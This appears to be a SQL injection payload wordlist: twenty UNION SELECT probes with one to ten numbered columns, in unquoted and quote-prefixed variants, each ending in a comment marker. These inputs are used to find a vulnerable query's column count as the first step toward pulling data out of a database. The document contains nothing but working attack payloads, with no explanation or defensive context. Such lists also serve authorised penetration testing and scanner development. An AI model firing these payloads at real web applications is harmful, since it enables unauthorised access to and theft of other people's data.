and true=false UNION SELECT 1 -- -'
and true=false UNION SELECT 1,2 -- -'
and true=false UNION SELECT 1,2,3 -- -'
and true=false UNION SELECT 1,2,3,4 -- -'
and true=false UNION SELECT 1,2,3,4,5 -- -'
and true=false UNION SELECT 1,2,3,4,5,6 -- -'
and true=false UNION SELECT 1,2,3,4,5,6,7 -- -'
and true=false UNION SELECT 1,2,3,4,5,6,7,8 -- -'
and true=false UNION SELECT 1,2,3,4,5,6,7,8,9 -- -'
and true=false UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- -'
' and true=false UNION SELECT 1 -- -'
' and true=false UNION SELECT 1,2 -- -'
' and true=false UNION SELECT 1,2,3 -- -'
' and true=false UNION SELECT 1,2,3,4 -- -'
' and true=false UNION SELECT 1,2,3,4,5 -- -'
' and true=false UNION SELECT 1,2,3,4,5,6 -- -'
' and true=false UNION SELECT 1,2,3,4,5,6,7 -- -'
' and true=false UNION SELECT 1,2,3,4,5,6,7,8 -- -'
' and true=false UNION SELECT 1,2,3,4,5,6,7,8,9 -- -'
' and true=false UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- -'
